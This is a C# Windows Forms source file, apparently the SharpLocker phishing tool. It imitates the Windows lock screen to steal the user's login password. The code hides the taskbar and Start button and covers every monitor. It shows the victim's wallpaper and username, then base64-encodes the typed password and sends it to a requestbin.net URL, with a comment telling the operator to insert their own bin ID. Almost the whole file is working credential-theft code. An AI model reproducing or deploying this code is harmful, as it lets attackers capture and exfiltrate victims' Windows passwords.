using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Net;
using Microsoft.Win32;
using System.IO;


namespace SharpLocker
{
    public partial class LockScreenForm : Form
    {
        public LockScreenForm()
        {

            InitializeComponent();
            Taskbar.Hide();
            FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            WindowState = FormWindowState.Normal;
            StartPosition = FormStartPosition.Manual;
            Location = new Point(0, 0);
            Size = new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Image myimage = new Bitmap(@Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft\\Windows\\Themes\\TranscodedWallpaper"));
            BackgroundImage = myimage;
            BackgroundImageLayout = ImageLayout.Stretch;
            this.TopMost = true;
            string userName = System.Environment.UserName.ToString();
            UserNameLabel.Text = userName;
            UserNameLabel.BackColor = System.Drawing.Color.Transparent;

            int percentHeight = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100);
            int middleWidth = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Width) / 2);
            int tbsize = 28;
            int tbwidth = 200;
            
            ProfileIcon.Top = percentHeight * 27;
            ProfileIcon.Left = middleWidth - 100;

            UserNameLabel.Top = percentHeight * 51;
            UserNameLabel.Left = middleWidth - 201;
            
            SubmitPasswordButton.Top = Convert.ToInt32(percentHeight * 59 - (tbsize * 0.125));
            SubmitPasswordButton.Left = middleWidth + (tbwidth / 2) - 11;

            show.Top = Convert.ToInt32(percentHeight * 59 - (tbsize * 0.125));
            show.Left = middleWidth + (tbwidth / 2) - 45;

            PasswordTextBox.Top = Convert.ToInt32(percentHeight * 59.4);
            PasswordTextBox.Size = new System.Drawing.Size(tbwidth-4, Convert.ToInt32(tbsize));
            PasswordTextBox.Left = middleWidth - (tbwidth / 2) - 12;

            textboxBackground.Top = Convert.ToInt32(percentHeight * 59 - (tbsize*0.125));
            textboxBackground.Left = Convert.ToInt32(middleWidth - (tbwidth / 2) - (tbsize * 0.125) - 12);
            textboxBackground.Size = new System.Drawing.Size(Convert.ToInt32(tbwidth + (tbsize * 0.25)), Convert.ToInt32(tbsize*1.25));

            power.Left = Screen.PrimaryScreen.Bounds.Width - 60;
            power.Top = Screen.PrimaryScreen.Bounds.Height - 60;

            accessibility.Left = Screen.PrimaryScreen.Bounds.Width - 110;
            accessibility.Top = Screen.PrimaryScreen.Bounds.Height - 60;

            language.Left = Screen.PrimaryScreen.Bounds.Width - 160;
            language.Top = Screen.PrimaryScreen.Bounds.Height - 60;

            foreach (var screen in Screen.AllScreens)
            {

                Thread thread = new Thread(() => WorkThreadFunction(screen));
                thread.Start();
            }


        }

        
        public class Taskbar
        {
            [DllImport("user32.dll")]
            private static extern int FindWindow(string className, string windowText);

            [DllImport("user32.dll")]
            private static extern int ShowWindow(int hwnd, int command);

            [DllImport("user32.dll")]
            public static extern int FindWindowEx(int parentHandle, int childAfter, string className, int windowTitle);

            [DllImport("user32.dll")]
            private static extern int GetDesktopWindow();

            private const int SW_HIDE = 0;
            private const int SW_SHOW = 1;

            protected static int Handle
            {
                get
                {
                    return FindWindow("Shell_TrayWnd", "");
                }
            }

            protected static int HandleOfStartButton
            {
                get
                {
                    int handleOfDesktop = GetDesktopWindow();
                    int handleOfStartButton = FindWindowEx(handleOfDesktop, 0, "button", 0);
                    return handleOfStartButton;
                }
            }

            private Taskbar()
            {
                // hide ctor
            }

            public static void Show()
            {
                ShowWindow(Handle, SW_SHOW);
                ShowWindow(HandleOfStartButton, SW_SHOW);
            }

            public static void Hide()
            {
                ShowWindow(Handle, SW_HIDE);
                ShowWindow(HandleOfStartButton, SW_HIDE);
            }
        }

        public void WorkThreadFunction(Screen screen)
        {
            try
            {
                if (screen.Primary == true)
                {
                   
                    
                }

                if (screen.Primary == false)
                {
                    int mostLeft = screen.WorkingArea.Left;
                    int mostTop = screen.WorkingArea.Top;
                    Debug.WriteLine(mostLeft.ToString(), mostTop.ToString());
                    using (Form form = new Form())
                    {
                        form.WindowState = FormWindowState.Normal;
                        form.StartPosition = FormStartPosition.Manual;
                        form.Location = new Point(mostLeft, mostTop);
                        form.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
                        form.Size = new Size(screen.Bounds.Width, screen.Bounds.Height);
                        form.BackColor = Color.Black;
                        form.ShowDialog();
                    }
                }
            }
            catch (Exception ex)
            {
                // log errors
            }
        }


        private void button1_Click(object sender, EventArgs e)
        {

        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }


        private void UserNameLabel_Click(object sender, EventArgs e)
        {

        }

        protected override CreateParams CreateParams
        {
            get
            {
                var parms = base.CreateParams;
                parms.Style &= ~0x02000000;  // Turn off WS_CLIPCHILDREN
                parms.ExStyle |= 0x02000000;
                return parms;
            }
        }

        private void pictureBox2_Click(object sender, EventArgs e)
        {
            Taskbar.Show();
            System.Windows.Forms.Application.Exit();
        }

        protected override void OnClosing(CancelEventArgs e)
        {
                Taskbar.Show();
            base.OnClosing(e);
        }

        private void PasswordTextBox_TextChanged(object sender, EventArgs e)
        {
        
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void pictureBox3_Click(object sender, EventArgs e)
        {
            Taskbar.Show();
            System.Windows.Forms.Application.Exit();
        }

        private void button1_Click_1(object sender, EventArgs e)
        {
            byte[] byt = System.Text.Encoding.UTF8.GetBytes(PasswordTextBox.Text);
            var base64 = Convert.ToBase64String(byt);

            // Get your own requestbin ID and change the "x".
            HttpWebRequest req = (HttpWebRequest)WebRequest.Create("http://requestbin.net/r/xxxxxxxx?" + base64);
            req.GetResponse();

            Taskbar.Show();
            System.Windows.Forms.Application.Exit();
        }

        private void LockScreenForm_Load(object sender, EventArgs e)
        {

        }
    }
    

}

public class MyTextBox : TextBox
{
    const int WM_NCPAINT = 0x85;
    const uint RDW_INVALIDATE = 0x1;
    const uint RDW_IUPDATENOW = 0x100;
    const uint RDW_FRAME = 0x400;
    [DllImport("user32.dll")]
    static extern IntPtr GetWindowDC(IntPtr hWnd);
    [DllImport("user32.dll")]
    static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);
    [DllImport("user32.dll")]
    static extern bool RedrawWindow(IntPtr hWnd, IntPtr lprc, IntPtr hrgn, uint flags);
    Color borderColor = Color.Blue;
    public Color BorderColor
    {
        get { return borderColor; }
        set
        {
            borderColor = value;
            RedrawWindow(Handle, IntPtr.Zero, IntPtr.Zero,
                RDW_FRAME | RDW_IUPDATENOW | RDW_INVALIDATE);
        }
    }
    protected override void WndProc(ref Message m)
    {
        base.WndProc(ref m);
        if (m.Msg == WM_NCPAINT && BorderColor != Color.Transparent &&
            BorderStyle == System.Windows.Forms.BorderStyle.Fixed3D)
        {
            var hdc = GetWindowDC(this.Handle);
            using (var g = Graphics.FromHdcInternal(hdc))
            using (var p = new Pen(BorderColor))
                g.DrawRectangle(p, new Rectangle(0, 0, Width - 1, Height - 1));
            ReleaseDC(this.Handle, hdc);
        }
    }
    protected override void OnSizeChanged(EventArgs e)
    {
        base.OnSizeChanged(e);
        RedrawWindow(Handle, IntPtr.Zero, IntPtr.Zero,
               RDW_FRAME | RDW_IUPDATENOW | RDW_INVALIDATE);
    }
}